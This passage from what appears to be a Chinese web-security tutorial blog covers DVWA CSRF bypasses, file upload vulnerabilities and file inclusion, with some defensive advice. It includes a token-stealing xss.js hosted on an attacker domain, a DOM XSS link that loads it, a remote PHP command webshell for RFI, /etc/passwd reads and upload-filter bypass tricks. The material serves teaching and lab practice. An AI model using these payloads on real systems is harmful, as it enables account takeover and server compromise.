/></p><p>我们还是按照之前的操作，先诱惑受害者点击|<code>http://www.hack.com/test.html</code>|，抓包，并发送到Repeater中：</p><p><img src="https://img-blog.csdnimg.cn/20190916200226800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>执行失败，出现:That request didn’t look correct.</p><p>此时让受害者访问|<code>www.dvwa.com.html|</code>文件，即在Repeater中修改HTTP数据包中的Referer参数为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.hack.com&#x2F;www.dvwa.com.html</span><br></pre></td></tr></table></figure><p>成功修改了密码：</p><p><img src="https://img-blog.csdnimg.cn/20190916200314617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h1 id="4-high-security-level"><a class="markdownIt-Anchor" href="#4-high-security-level"></a> 4 High Security Level</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High Security Level的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.123.132&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;test&amp;password_conf&#x3D;test&amp;Change&#x3D;Change&amp;user_token&#x3D;abf812881f8f67e687a50639ee58f29d#</span><br></pre></td></tr></table></figure><p>向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><h2 id="41-exploit"><a class="markdownIt-Anchor" href="#41-exploit"></a> 4.1 Exploit</h2><p>要绕过High Security Level的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p><p>试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。<br /><kbd>xss.js:</kbd></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>xss.js放置于攻击者的网站上：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.hack.com&#x2F;xss.js</span><br></pre></td></tr></table></figure><p>DOM XSS 与 CSRF 结合：CSRF结合同Security Level的DOM XSS，通过XSS来获取用户的user_token；通过CSRF来伪造URL，冒充用户身份修改密码。用以下链接来让受害者访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dvwa.com&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English #&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.hack.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190916200641642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>诱导点击后，成功将密码修改为test</p><h1 id="5-impossible-security-level"><a class="markdownIt-Anchor" href="#5-impossible-security-level"></a> 5 Impossible Security Level</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Impossible Security Level的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全之文件上传漏洞</title>
      <link href="/2020/02/21/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/21/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍"></a> 1 漏洞介绍</h1><p>系统管理员都有过系统被上传后门、木马或者是网页被人篡改的经历，这类攻击大部分是通过文件上传来是实现的。文件上传漏洞是指网络攻击者上传了一个可执行文件到服务器并执行。这里上传的文件可以是木马、病毒、恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，作为网页后门，攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，获得命令执行环境，以达到控制网站服务器的目的（包括上传下载或者修改文件、操作数据库、执行任意命令等）。</p><p>文件上传漏洞原理：大部分的网站和应用系统都有上传功能，如用户头像上传、图片上传、文档上传等。一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。当系统存在文件上传漏洞时攻击者可以将病毒、木马、WebShell以及其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP、ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</p><h1 id="2-漏洞产生条件"><a class="markdownIt-Anchor" href="#2-漏洞产生条件"></a> 2 漏洞产生条件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、首先当然是要能够成功上传木马文件</span><br><span class="line">2、其次上传文件必须能够被执行</span><br><span class="line">3、最后就是上传文件的路径必须可知</span><br></pre></td></tr></table></figure><h1 id="3-漏洞利用思路"><a class="markdownIt-Anchor" href="#3-漏洞利用思路"></a> 3 漏洞利用思路</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、对于没有对上传文件做过滤对，可以直接上传</span><br><span class="line">2、如果利用Content-Type过滤了文件类型：</span><br><span class="line">  （1）上传PHP格式的一句话：FireFox，F12--&gt;网络--&gt;选中发送包--&gt;Edit and Rsend--&gt;修改Request Body中的Content-Type--&gt;发送；</span><br><span class="line">  （2）上传PHP格式的一句话：用Burp Suit抓包修改Content-Type；</span><br><span class="line">  （3）上传图片格式的一句话：用BP抓包后，用%00截断，如eval.php%00a.png</span><br><span class="line">  （4）上传图片格式的一句话：利用文件包含漏洞，将图片强制作为php进行解释</span><br><span class="line">3、如果利用后缀过滤了文件类型和文件头：</span><br><span class="line">  （1）直接上传图片之后利用文件包含漏洞，将图片强制作为php进行解释</span><br><span class="line">  （2）利用copy命令将PHP一句话和图片合并，上传图片格式的图片码，直接连接webshell</span><br><span class="line"></span><br><span class="line">（注：PHP 5.2.x之后的版本不支持%00截断）</span><br></pre></td></tr></table></figure><p>PS：<br />一句话的原理是利用POST控制变量来执行动作<br />中国菜刀连接失败可以用AntSword<br />Kali Linux的weevely可以用来生成webshell文件和连接webshell。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全之文件包含漏洞</title>
      <link href="/2020/02/21/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/21/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-文件包含漏洞成因"><a class="markdownIt-Anchor" href="#1-文件包含漏洞成因"></a> 1 文件包含漏洞成因</h1><p>文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含File inclusion。文件包含可能会出现在jsp、php、asp等语言中。服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。常见的文件包含的函数如下：</p><p><kbd>PHP</kbd>：|<code>include() 、include_once()、require()、require_once()、fopen()、readfile()</code><br /><kbd>JSP/Servlet</kbd>：|<code>&lt;/kbd&gt;ava.io.file()、java.io.filereader()</code>|<br /><kbd>ASP</kbd>：|<code>include file、include virtual</code>|</p><ul><li><p><kbd>Include</kbd>：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。</p></li><li><p><kbd>Require</kbd>：跟include唯一不同的是，当产生错误时候，include会继续运行而require停止运行</p></li><li><p><kbd>Include_once</kbd>：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p></li><li><p><kbd>Require_once</kbd>：这个函数跟require函数作用几乎相同，与include_once和include类似</p></li><li><p><kbd>php.ini配置文件</kbd>：allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&amp;本地包含，php5仅存在本地包含。</p></li></ul><p>使用上面几个函数包含文件时，该文件将作为PHP代码执行，PHP内核并不在意被包含的文件是什么类型的。也就是说我们用这几个函数包含.jpg文件时，也会将其当做php文件来执行。</p><h1 id="2-为什么要包含文件"><a class="markdownIt-Anchor" href="#2-为什么要包含文件"></a> 2 为什么要包含文件？</h1><p>程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用。在php里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 main.php里包含share.php,我将这样写 include(“share.php”) ，然后就可以使用share.php中的函数了，像这个写死需要包含的文件名称的自然没有什么问题，也不会出现漏洞，那么问题到底是出在哪里呢？</p><p>有的时候可能并不能确定需要包含哪个文件，比如看下面的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[page]) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[page];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"home.php"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码的使用格式可能是这样的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;hi.baidu.com&#x2F;m4r10&#x2F;php&#x2F;index.php?page&#x3D;main.php</span><br></pre></td></tr></table></figure><p><strong>1、提交上面这个URL，在index.php中就取得这个page的值（$_GET[page]）。</strong></p><p><strong>2、判断$_GET[page]是不是空，若不空（这里是main.php）就用include来包含这个文件。</strong></p><p><strong>3、 若$_GET[page]空的话就执行else，来 include &quot;home.php&quot;这个文件。</strong></p><p>你也许要说，这样很好呀，可以按照URL来动态包含文件，多么方便呀，怎么产生漏洞的呢？问题的答案是：我们不乖巧，我们总喜欢和别人不一样，我们不会按照他的链接来操作，我们可能想自己写想包含（调用）的文件。比如下面说的！</p><h1 id="3-如何利用这个漏洞"><a class="markdownIt-Anchor" href="#3-如何利用这个漏洞"></a> 3 如何利用这个漏洞？</h1><h2 id="31-本地包含lfi"><a class="markdownIt-Anchor" href="#31-本地包含lfi"></a> 3.1 本地包含(LFI)</h2><ul><li>本地包含条件：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、allow_url_fopen&#x3D;On </span><br><span class="line"></span><br><span class="line">2、用户可以动态控制变量</span><br></pre></td></tr></table></figure><p>针对以上代码，比如我们会随便的写入下面这个URL：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http: &#x2F;&#x2F;hi.baidu.com&#x2F;m4r10&#x2F;php&#x2F;index.php?page&#x3D;hello.php。</span><br></pre></td></tr></table></figure><p>然后我们的index.php程序就傻傻按照上面我们说得步骤去执行：取page为hello.php，然后去include(hello.php)。这时问题出现了，因为我们并没有hello.php这个文件，所以它 include的时候就会报警告，类似下列信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Quote:</span><br><span class="line">Warning: include(hello.php) [function.include]: failed to open stream: No such file or directory in &#x2F;vhost&#x2F;wwwroot&#x2F;php&#x2F;index.phpon line 3</span><br><span class="line">Warning: include() [function.include]: Failed opening hello.php for inclusion (include_path&#x3D;.:) in &#x2F;vhost&#x2F;wwwroot&#x2F;php&#x2F;index.php on line 3</span><br></pre></td></tr></table></figure><p>第一行的那个Warning就是找不到我们指定的hello.php文件，也就是包含不到我们指定路径的文件；</p><p>而第二行的警告是因为前面没有找到指定文件，所以包含的时候就出警告了。</p><p>通过报错，我们可以得知绝对路径 /vhost/wwwroot/php/</p><p>我们可以多次探测来包含其他文件，比如指定 <a href="http://www.xxx.com/index.php?test=./123.txt%EF%BC%8C%E6%9D%A5%E8%AF%BB%E5%87%BA%E5%BD%93%E5%89%8D%E8%B7%AF%E5%BE%84%E4%B8%8B%E7%9A%84123.txt%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8../%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E8%B7%B3%E8%BD%AC%EF%BC%88%E5%9C%A8%E6%B2%A1%E8%BF%87%E6%BB%A4../%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%89%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">www.xxx.com/index.php?test=./123.txt，来读出当前路径下的123.txt，也可以使用../来进行目录跳转（在没过滤../的情况下），也可以直接指定绝对路径，读取敏感的系统文件</a> ，比如 <a href="http://www.xxx.com/index.php?test=/etc/passwd,%E5%A6%82%E6%9E%9C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%B2%A1%E6%9C%89%E5%AF%B9%E6%9D%83%E9%99%90%E9%99%90%E5%88%B6%E7%9A%84%E5%BE%88%E4%B8%A5%E6%A0%BC%EF%BC%8C%E6%88%96%E8%80%85%E5%90%AF%E5%8A%A8Apache%E7%9A%84%E6%9D%83%E9%99%90%E6%AF%94%E8%BE%83%E9%AB%98%EF%BC%8C%E6%98%AF%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%87%BA%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%9A%84%E3%80%82%E5%90%A6%E5%88%99%E5%B0%B1%E4%BC%9A%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E7%B1%BB%E4%BC%BC%E4%BA%8E%EF%BC%9Aopen_basedir" target="_blank" rel="noopener">www.xxx.com/index.php?test=/etc/passwd,如果目标主机没有对权限限制的很严格，或者启动Apache的权限比较高，是可以读出这个文件内容的。否则就会得到一个类似于：open_basedir</a> restriction in effect. 的 Warning。</p><p>如果我们可以上传文件的话，我们可以上传一句话木马，然后再包含一句话木马，再用菜刀连接拿下网站的Webshell</p><ul><li>本地文件包含漏洞利用技巧：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、包含用户上传的文件 (我们上传的一句话木马等等)</span><br><span class="line"></span><br><span class="line">2、包含data:&#x2F;&#x2F; 或 php:&#x2F;&#x2F;input 等伪协议</span><br><span class="line"></span><br><span class="line">3、包含 Session 文件</span><br><span class="line"></span><br><span class="line">4、包含日志文件（通过构造语句让服务器报错并将一句话随报错信息写入日志；找到日志文件路径，包含此文件；用菜刀连接；拿下网站的Webshell ）</span><br></pre></td></tr></table></figure><h2 id="32-远程包含rfi"><a class="markdownIt-Anchor" href="#32-远程包含rfi"></a> 3.2 远程包含(RFI)</h2><ul><li>远程包含条件：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、allow_url_include&#x3D;On</span><br><span class="line"></span><br><span class="line">2、用户可以动态控制变量</span><br></pre></td></tr></table></figure><p>我们可以指定其他URL上的一个我们写的一句话木马，然后用菜刀连接获取Webshell。</p><p>我们还可以指定其它URL上的一个包含PHP代码的webshell来直接运行，比如，我先写一段运行命令的PHP代码，如下保存为cmd.txt（后缀不重要，只要内容为PHP格式就可以了）。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;$_REQUEST[<span class="string">"cmd"</span>]=stripslashes($_REQUEST[<span class="string">"cmd"</span>]);&#125;　<span class="comment">//去掉转义字符（可去掉字符串中的反斜线字符）</span></span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);　<span class="comment">//设定针对这个文件的执行时间，0为不限制.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"开始行"</span>;　　　　　　 <span class="comment">//打印的返回的开始行提示信息</span></span><br><span class="line">passthru($_REQUEST[<span class="string">"cmd"</span>]);　　　<span class="comment">//运行cmd指定的命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"结束行"</span>;　　　　　　 <span class="comment">//打印的返回的结束行提示信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上这个文件的作用就是接受cmd指定的命令，并调用passthru函数执行，把内容返回在开始行与结束行之间。把这个文件保存到我们主机的服务器上（可以是不支持PHP的主机），只要能通过HTTP访问到就可以了，例如地址如下：<a href="http://www.xxx.cn/cmd.txt%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%9C%A8%E9%82%A3%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%9E%84%E9%80%A0%E5%A6%82%E4%B8%8BURL%E6%9D%A5%E5%88%A9%E7%94%A8%E4%BA%86%EF%BC%9A" target="_blank" rel="noopener">http://www.xxx.cn/cmd.txt，然后我们就可以在那个漏洞主机上构造如下URL来利用了：</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;hi.baidu.com&#x2F;m4r10&#x2F;php&#x2F;index.php?page&#x3D;http: &#x2F;&#x2F;www.xxx.cn&#x2F;cmd.txt?cmd&#x3D;ls</span><br></pre></td></tr></table></figure><p>其中cmd后面的就是你需要执行的命令，其它常用的命令（以*UNIX为例）如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、ll 列目录、文件（相当于Windows下dir)</span><br><span class="line"></span><br><span class="line">2、pwd 查看当前绝对路径</span><br><span class="line"></span><br><span class="line">3、whoami 查看当前用户</span><br><span class="line"></span><br><span class="line">4、wget　下载指定URL的文件</span><br></pre></td></tr></table></figure><h1 id="4-文件包含漏洞的防御"><a class="markdownIt-Anchor" href="#4-文件包含漏洞的防御"></a> 4 文件包含漏洞的防御</h1><p>在php中，文件包含需要配置allow_url_include=On(远程文件包含)、allow_url_fopen=On(本地文件包含) 。所以，我们可以将其关闭，这样就可以杜绝文件包含漏洞了。但是，某些情况下，不能将其关闭，必须进行包含的话，我们可以使用白名单过滤的方法，只能包含我们指定的文件。这样，就可以杜绝文件包含漏洞了。</p><h1 id="5-附录"><a class="markdownIt-Anchor" href="#5-附录"></a> 5 附录</h1><p>1、DVWA-File Include：<a href="https://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a><br />2、关于编码</p><ul><li>正常流程：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">浏览器将URL不支持的字符进行URL十六进制编码，传送给服务器;</span><br><span class="line"></span><br><span class="line">服务器解码后交给后端php处理；</span><br><span class="line"></span><br><span class="line">后端处理完后将编码的URL返回给浏览器，由浏览器解码。</span><br></pre></td></tr></table></figure><ul><li>对于a-z 